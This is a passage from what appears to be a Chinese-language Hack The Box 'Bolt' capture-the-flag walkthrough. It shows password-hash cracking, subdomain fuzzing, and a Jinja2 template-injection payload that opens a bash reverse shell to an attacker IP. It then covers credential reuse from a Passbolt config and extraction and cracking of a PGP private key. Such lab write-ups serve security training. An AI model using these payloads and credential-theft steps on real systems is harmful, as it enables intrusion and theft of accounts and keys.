user;\n1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||\n```\n得到了一个账号，邮箱，以及一穿密码hash\n\n使用john爆破一下密码\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"\nUse the \"--format=md5crypt-long\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ndeadbolt         (?)\n1g 0:00:00:01 DONE (2022-01-06 01:11) 0.6451g/s 111483p/s 111483c/s 111483C/s debie..curtis13\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\n现在得到了账号密码\n\n```bash\nusername = admin\npassword = deadbolt\nemail = admin@bolt.htb\n```\n拿着账号密码去登录后台\n\n![](Hackthebox-Bolt/98b50cc5-292b-44ee-b820-5456a52bdec2.png)\n\n![](Hackthebox-Bolt/8a656953-372b-45bf-982a-42d3c6e06a58.png)\n\n在首页的位置，有一个在线聊天窗口，我感觉应该是有XSS没跑\n\n在聊天内容中提到了有其他主机，那就找一下吧，看看能不能找到\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://bolt.htb\" -H \"Host:FUZZ.bolt.htb\" -fs 30347\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://bolt.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.bolt.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 30347\n________________________________________________\n\ndemo                    [Status: 302, Size: 219, Words: 22, Lines: 4]\nmail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]\nlists                   [Status: 200, Size: 0, Words: 1, Lines: 1]\nvideos                  [Status: 200, Size: 0, Words: 1, Lines: 1]\ndisco                   [Status: 200, Size: 0, Words: 1, Lines: 1]\n:: Progress: [4989/4989] :: Job [1/1] :: 35 req/sec :: Duration: [0:02:34] :: Errors: 0 ::\n```\n发现两个可用子域名demo和mail，给他们加入到hosts里\n\n```bash\necho 10.10.11.114 demo.bolt.htb mail.bolt.htb >> /etc/hosts\n```\n![](Hackthebox-Bolt/3fa3fcba-3a29-41de-a2d5-36082048b465.png)\n\n在demo这一个页面里发现有新的注册点，可以进行注册，但是缺少了一个邀请码\n\n```bash\n┌──(root💀kali)-[~/Desktop/image]\n└─# grep -iR -A 2 'invite_code' 2>/dev/null\n--\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html:            {{ form.invite_code(placeholder=\"Invite Code\", class=\"form-control\") }}\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html-            <div class=\"input-group-append\">\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html-              <div class=\"input-group-text\">\n--\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py:    invite_code = TextField('Invite Code', id='invite_code'    , validators=[DataRequired()])\n--\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py:        code          = request.form['invite_code']\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py-        if code != 'XNSS-HSJW-3NGU-8XTJ':\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py-            return render_template('code-500.html')\n```\n显示邀请码在41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py中，去查看一下\n\n```bash\nif code != 'XNSS-HSJW-3NGU-8XTJ':\n```\n找到邀请码，去注册一个账号\n\n![](Hackthebox-Bolt/6172ed51-339f-4ee8-8af0-ba599b0e21c7.png)\n\n注册后登录即可，新注册的账号在demo和mail上都可以进行登录\n\n![](Hackthebox-Bolt/0a86f004-5a88-4612-88c9-7b822ec78b24.png)\n\n在setting处的name里，存在一个SSTI，这里测试一下\n\n![](Hackthebox-Bolt/5bb947f1-58ed-417d-9ae1-13fd4b88496b.png)\n\n修改后收到了邮件\n\n![](Hackthebox-Bolt/367ca903-705e-4996-892a-e902edfe24c6.png)\n\n点击链接确认后，仪表盘上没有任何变化，但是却收到了另一封邮件，里面显示了我们输入的结果\n\n确认存在SSTI\n\n> [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/add722d1c27d90f15d313e8846e5a0f8b36a403a/Server Side Template Injection/README.md#exploit-the-ssti-by-calling-ospopenread](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/add722d1c27d90f15d313e8846e5a0f8b36a403a/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread)\n\n![](Hackthebox-Bolt/f7d846d1-3503-4b7b-99dc-53346f1be9e1.png)\n\n使用该poc进行利用\n\n![](Hackthebox-Bolt/a98b0be8-4241-47e1-9aed-de6d085c85fb.png)\n\n成功执行命令\n\n现在构造一个poc来获得一个shell\n\n```bash\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c \"/bin/bash -i &>/dev/tcp/10.10.14.16/4444 <&1\"').read() }}\n```\n在执行poc之前，先使用nc监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.16] from (UNKNOWN) [10.10.11.114] 47908\nbash: cannot set terminal process group (958): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@bolt:~/demo$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功获得一个shell\n\n## 权限提升\n### User\n查找一下有登陆权限的账户\n\n```bash\nwww-data@bolt:/home$ grep 'bash' /etc/passwd\ngrep 'bash' /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\neddie:x:1000:1000:Eddie Johnson,,,:/home/eddie:/bin/bash\nclark:x:1001:1001:Clark Griswold,,,:/home/clark:/bin/bash\n```\neddie和clark都有登陆权限\n\n在目录/etc/passbolt下发现了一个有趣的文件passbolt.php，我们去查看一下\n\n```php\n<?php\n/**\n * Passbolt ~ Open source password manager for teams\n * Copyright (c) Passbolt SA (https://www.passbolt.com)\n *\n * Licensed under GNU Affero General Public License version 3 of the or any later version.\n * For full copyright and license information, please see the LICENSE.txt\n * Redistributions of files must retain the above copyright notice.\n *\n * @copyright     Copyright (c) Passbolt SA (https://www.passbolt.com)\n * @license       https://opensource.org/licenses/AGPL-3.0 AGPL License\n * @link          https://www.passbolt.com Passbolt(tm)\n * @since         2.0.0\n */\n/**\n * PASSBOLT CONFIGURATION FILE\n *\n * This is a generated configuration file, which was generated by the passbolt web installer.\n *\n * To see all available options, you can refer to the default.php file, or replace this file\n * by a copy of passbolt.default.php\n * Do not modify default.php or you may break your upgrade process.\n *\n * Read more about how to install passbolt: https://www.passbolt.com/help/tech/install\n * Any issue, check out our FAQ: https://www.passbolt.com/faq\n * An installation issue? Ask for help to the community: https://community.passbolt.com/\n */\nreturn [\n    'App' => [\n        // A base URL to use for absolute links.\n        // The url where the passbolt instance will be reachable to your end users.\n        // This information is need to render images in emails for example\n        'fullBaseUrl' => 'https://passbolt.bolt.htb',\n    ],\n\n    // Database configuration.\n    'Datasources' => [\n        'default' => [\n            'host' => 'localhost',\n            'port' => '3306',\n            'username' => 'passbolt',\n            'password' => 'rT2;jW7<eY8!dX8}pQ8%',\n            'database' => 'passboltdb',\n        ],\n    ],\n\n    // Email configuration.\n    'EmailTransport' => [\n        'default' => [\n            'host' => 'localhost',\n            'port' => 587,\n            'username' => null,\n            'password' => null,\n            // Is this a secure connection? true if yes, null if no.\n            'tls' => true,\n            //'timeout' => 30,\n            //'client' => null,\n            //'url' => null,\n        ],\n    ],\n    'Email' => [\n        'default' => [\n            // Defines the default name and email of the sender of the emails.\n            'from' => ['localhost@bolt.htb' => 'localhost'],\n            //'charset' => 'utf-8',\n            //'headerCharset' => 'utf-8',\n        ],\n    ],\n    'passbolt' => [\n        // GPG Configuration.\n        // The keyring must to be owned and accessible by the webserver user.\n        // Example: www-data user on Debian\n        'gpg' => [\n            // Main server key.\n            'serverKey' => [\n                // Server private key fingerprint.\n                'fingerprint' => '59860A269E803FA094416753AB8E2EFB56A16C84',\n                'public' => CONFIG . DS . 'gpg' . DS . 'serverkey.asc',\n                'private' => CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc',\n            ],\n        ],\n        'registration' => [\n            'public' => false,\n        ],\n        'ssl' => [\n            'force' => true,\n        ]\n    ],\n];\n```\n该文件提供了一个数据库的账号密码，登入查看一下\n\n```sql\n/etc/passbolt$ mysql -upassbolt -p\n\nmysql> show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| passboltdb         |\n+--------------------+\n\nmysql> use passboltdb\n\nmysql> show tables;\nshow tables;\n+-----------------------+\n| Tables_in_passboltdb  |\n+-----------------------+\n| account_settings      |\n| action_logs           |\n| actions               |\n| authentication_tokens |\n| avatars               |\n| comments              |\n| email_queue           |\n| entities_history      |\n| favorites             |\n| gpgkeys               |\n| groups                |\n| groups_users          |\n| organization_settings |\n| permissions           |\n| permissions_history   |\n| phinxlog              |\n| profiles              |\n| resource_types        |\n| resources             |\n| roles                 |\n| secret_accesses       |\n| secrets               |\n| secrets_history       |\n| user_agents           |\n| users                 |\n+-----------------------+\n\nmysql> select * from users;\nselect * from users;\n+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+\n| id                                   | role_id                              | username       | active | deleted | created             | modified            |\n+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+\n| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 1cfcd300-0664-407e-85e6-c11664a7d86c | eddie@bolt.htb |      1 |       0 | 2021-02-25 21:42:50 | 2021-02-25 21:55:06 |\n| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 975b9a56-b1b1-453c-9362-c238a85dad76 | clark@bolt.htb |      1 |       0 | 2021-02-25 21:40:29 | 2021-02-25 21:42:32 |\n+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+\n2 rows in set (0.00 sec)\n```\n很可惜没有找到密码\n\n不过发现还有一个secrets的字段，查看一下\n\n```sql\nmysql> desc secrets;\ndesc secrets;\n+-------------+------------+------+-----+---------+-------+\n| Field       | Type       | Null | Key | Default | Extra |\n+-------------+------------+------+-----+---------+-------+\n| id          | char(36)   | NO   | PRI | NULL    |       |\n| user_id     | char(36)   | NO   | MUL | NULL    |       |\n| resource_id | char(36)   | NO   | MUL | NULL    |       |\n| data        | mediumtext | NO   |     | NULL    |       |\n| created     | datetime   | NO   |     | NULL    |       |\n| modified    | datetime   | NO   |     | NULL    |       |\n+-------------+------------+------+-----+---------+-------+\n6 rows in set (0.01 sec)\n\nmysql> select data from secrets;\nselect data from secrets;\n-----BEGIN PGP MESSAGE-----\nVersion: OpenPGP.js v4.10.9\nComment: https://openpgpjs.org\n\nwcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc\ng/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY\npCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H\noAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px\nl+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R\nzyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp\nedLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u\nl0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt\noPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7\nFUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov\n8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey\n5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY\nNdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a\nIebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs\nnO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6\nTQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984\n=P38i\n-----END PGP MESSAGE-----\n```\n但是没有私钥我们依然无法进行利用，尝试使用数据库的密码来登陆eddie账户\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh eddie@bolt.htb                                      \neddie@bolt.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-051300-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nYour Hardware Enablement Stack (HWE) is supported until April 2025.\nYou have mail.\nLast login: Fri Jan  7 21:38:40 2022 from 10.10.14.56\neddie@bolt:~$ whoami&&id\neddie\nuid=1000(eddie) gid=1000(eddie) groups=1000(eddie)\n```\n登陆成功，那我们刚才不是白找了？\n\n```sql\neddie@bolt:~$ cat user.txt \n483ad2fdf8e588c500b8a58b286ffb8b\n```\n成功拿到user全新的flag文件\n\n### Root\n在/var/mail下找到了一封名为eddie的邮件，查看一下\n\n```bash\neddie@bolt:~$ cat /var/mail/eddie\nFrom clark@bolt.htb  Thu Feb 25 14:20:19 2021\nReturn-Path: <clark@bolt.htb>\nX-Original-To: eddie@bolt.htb\nDelivered-To: eddie@bolt.htb\nReceived: by bolt.htb (Postfix, from userid 1001)\n        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)\nSubject: Important!\nTo: <eddie@bolt.htb>\nX-Mailer: mail (GNU Mailutils 3.7)\nMessage-Id: <20210225212019.DFF264CD@bolt.htb>\nDate: Thu, 25 Feb 2021 14:20:19 -0700 (MST)\nFrom: Clark Griswold <clark@bolt.htb>\n\nHey Eddie,\n\nThe password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.\nOnce you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...\n\n-Clark\n```\n这里的大概意思就是Clark用户发了一封邮件，告诉Eddie用户，要注意备份私钥。既然提示里已经说了备份，那肯定就有，咱们去找出来就好\n\n```bash\neddie@bolt:~$ grep -iR \"BEGIN PGP\"\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:    if (!message.match(/-----BEGIN PGP MESSAGE-----/)) {\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PUBLIC_HEADER = '-----BEGIN PGP PUBLIC KEY BLOCK-----';\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  const reHeader = /^-----BEGIN PGP (MESSAGE, PART \\d+\\/\\d+|MESSAGE, PART \\d+|SIGNED MESSAGE|MESSAGE|PUBLIC KEY BLOCK|PRIVATE KEY BLOCK|SIGNATURE)-----$/m;\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  // BEGIN PGP MESSAGE, PART X/Y\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:    // BEGIN PGP MESSAGE, PART X\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      // BEGIN PGP SIGNED MESSAGE\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:        // BEGIN PGP MESSAGE\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:          // BEGIN PGP PUBLIC KEY BLOCK\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:            // BEGIN PGP PRIVATE KEY BLOCK\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // BEGIN PGP SIGNATURE\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // cleartext signatures. Note that PGP 2.x uses BEGIN PGP MESSAGE\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP MESSAGE, PART \" + partindex + \"/\" + parttotal + \"-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP MESSAGE, PART \" + partindex + \"-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"\\r\\n-----BEGIN PGP SIGNED MESSAGE-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"\\r\\n-----BEGIN PGP SIGNATURE-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP MESSAGE-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP SIGNATURE-----\\r\\n\");\nBinary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches\n.viminfo:~MSle0~/BEGIN PGP\n.viminfo::/BEGIN PGP\n.viminfo:|2,0,1642385169,,\"/BEGIN PGP\"\n.viminfo:? BEGIN PGP\n.viminfo:|2,1,1642385169,,\"BEGIN PGP\"\n```\n在eddie用户的目录下搜索BEGIN PGP可得到一些存在令牌的文件，查看发现主要着眼于.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log这个文件\n\n正常查看的时候是一堆乱码，我们使用vim打开，然后使用命令模式输入%s/\\\\\\\\r\\\\\\\\n/\\\\r/g，即可进入只管可看的状态\n\n然后得到了一串gpg\n\n```bash\n-----BEGIN PGP PRIVATE KEY BLOCK-----\nVersion: OpenPGP.js v4.10.9\nComment: https://openpgpjs.org\n\n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\nPSwYYWlAywj5\n=cqxZ\n-----END PGP PRIVATE KEY BLOCK-----\n```\n保存到桌面\n\n使用gpg2john给转换为hash格式\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gpg2john gpg.key > gpg.hash\n\nFile gpg.key\n\n┌──(root💀kali)-[~/Desktop]\n└─# cat gpg.hash               \nEddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson 